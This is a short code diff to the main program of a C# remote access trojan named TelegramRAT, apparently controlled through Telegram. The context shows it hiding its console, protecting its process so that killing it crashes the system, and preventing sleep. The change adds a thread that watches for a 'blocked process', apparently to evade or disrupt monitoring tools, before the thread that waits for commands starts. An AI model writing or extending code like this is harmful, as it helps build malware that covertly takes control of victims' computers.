@@ -15,6 +15,7 @@ namespace TelegramRAT
     class Program
     {
         [STAThreadAttribute]
+        [Obsolete]
         static void Main(string[] args)
         {
             // Hide console
@@ -49,6 +50,8 @@ namespace TelegramRAT
             // Protect process (BSOD)
             persistence.protectProcess();
             persistence.PreventSleep();
+            // Check for blocked process
+            persistence.processCheckerThread.Start();
             // Wait for new commands
             telegram.waitCommandsThread.Start();
             // Need for system power events
